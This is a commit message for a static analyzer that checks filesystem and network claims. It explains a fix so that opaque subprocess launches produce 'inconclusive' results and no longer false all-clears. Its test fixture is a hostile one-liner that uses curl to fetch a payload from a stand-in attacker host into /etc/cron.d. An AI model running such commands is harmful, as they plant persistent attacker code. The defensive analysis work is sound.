Original commit body from a5a8fd0e21bdb93fefba0e0daf3a97797bacb749:

INV-gahuz. A six-line program whose only statement is

    subprocess.run(["curl", "-o", "/etc/cron.d/pwned", "https://evil.example/p"])

returned `confirmed` rc 0 for BOTH a fs_write and a net_send must_not_exist
claim. It downloads a remote payload into a root cron directory. Two false
all-clears from one call, on the shipped CLI, no overlay and no flags.

The row was correct and that is the point: `subprocess.run` genuinely is a
subprocess primitive, so the classification is right. What was wrong is the
inference from "a row matched" to "this call was examined for every OTHER
boundary". That holds wherever a matched row implies a known and complete
surface — os.makedirs classified fs_write really is an examined negative for a
network claim — and inverts for the one boundary that names OPACITY: control
leaves the process and the launched program's I/O is not in the edge set at
all. Confirmed by probe rather than inferred: classify_call returns
boundary='subprocess' while module_io_is_enumerated("subprocess") is False, so
it is the classification shortcut granting this, not the enumeration branch.

    fixture                                    claim     before        after
    -----------------------------------------  --------  ------------  -------------
    subprocess.run(["curl","-o",FILE,URL])     fs_write  confirmed 0   inconclusive 2
    subprocess.run(["curl","-o",FILE,URL])     net_send  confirmed 0   inconclusive 2
    control  open("/etc/cron.d/pwned","w")     fs_write  violated  1   violated 1
    control  socket.connect(); socket.send()   net_send  violated  1   violated 1
    control  os.makedirs (classified, non-opaque, unenumerated module)
                                                         complete=True complete=True

The controls are what make the first two a defect rather than an analyzer that
cannot see, and the third is the discriminator: it and the subprocess fixture
are BOTH complete=True beforehand, both single classified calls over a module
with no enumeration record. A fix that merely stopped trusting classify_call
would turn both False. The distinction had to be the BOUNDARY.

OPACITY IS ASKED OF EVERY ROW, because the first version could be masked and
the parity test caught that on its first run. lookup_with_module returns ONE
primitive, so a call catalogued under two boundaries is reported under whichever
row wins. Measured across all 14 catalogues, 2 primitives are masked exactly
this way, both Scala: scala.sys.process.Process.apply and .run are declared
[fs_write, subprocess] and resolve to fs_write. Their own note says why the
second row exists — "Scala process execution (can write to filesystem via shell
commands)" — so the row recording that a launch may ALSO write is the row that
hid the launch. declares_opaque_crossing is therefore one-way: opaque if ANY row
says so, since a second boundary adds information about the same call rather
than retracting it.

The iteration is shared, not just the predicate. _opaque_launch_sites and
_uncatalogued_external_modules both walk _external_call_sites, extracted when
the second consumer appeared rather than after they drifted — INV-motos was two
callers sharing one predicate over DIFFERENT populations, and sharing
classify_call alone would not have caught it.

Direction is one-way: verify_claim returns `violated` outside the coverage
branch, so this can only move confirmed -> inconclusive, never suppress a
detection. Non-destruction re-asserted on both controls. Self-proof measured,
not assumed: 18/18 inconclusive before and after, blocked earlier by the taint
arm's own language census. Zero verdict change on this repo either way.

The disclosure names the CALL, not the module: "the I/O catalog could not
classify subprocess" would be false and would send a reader to add a row that
already exists. Reported BEFORE the uncatalogued-module list, deliberately — an
uncatalogued module is a gap the reader can close, an opaque launch is
categorical, and reporting the fixable blocker first would send them on an
errand that cannot succeed.

Found while writing io_primitives/bash.yaml, which this blocks. A six-line stub
mapping curl -> net_send makes a shell script that curls a secret go violated
rc 1 (detection the tool has never had), and the same six lines make a bash-only
repo running `curl -o /etc/cron.d/pwned` return confirmed rc 0 on an fs_write
claim where without the catalogue it is inconclusive. Shipping that catalogue
first would have multiplied this hole across the 84 distinct external commands
this repo's own scripts launch (467 launch edges, measured with analyze_bash).

Spun off rather than absorbed: INV-zumin (a multi-boundary primitive is TAGGED
with one boundary too, so Scala's Process.apply is undetectable as a subprocess
launch — 23 multi-boundary primitives across 8 catalogues, and the population is
NOT uniform: builtins.open is disambiguated by io_mode and works as designed,
C's unistd.write is undecidable at the call site) and WI-jupaf (erlang.yaml has
no subprocess section at all and catalogues os:cmd, the shell-out, as env_read +
env_write beside getenv/putenv).

